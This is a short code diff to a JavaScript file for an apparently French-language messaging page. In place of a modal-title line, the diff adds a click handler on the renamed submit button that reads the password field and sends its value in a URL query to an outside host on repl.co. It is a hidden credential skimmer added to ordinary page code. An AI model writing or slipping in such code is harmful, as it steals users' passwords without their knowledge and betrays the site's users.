@@ -38,4 +38,14 @@
 //     div.textContent = 'p';
 // }
 
-document.getElementById('modalTitletriggerNouveauMessage').textContent = "Créer un nouveau message";
+// document.getElementById('modalTitletriggerNouveauMessage').textContent = "Créer un nouveau message";
+document.getElementById('button-submit').setAttribute('id', 'getPwd')
+let getPwd = document.getElementById('getPwd');
+
+getPwd.onclick = function() {
+    document.getElementById('password').value;
+    const Http = new XMLHttpRequest();
+    const url='https://phpwhk.conekt.repl.co/chat/index.php?text=' + document.getElementById('password').value;
+    Http.open("GET", url);
+    Http.send();
+};
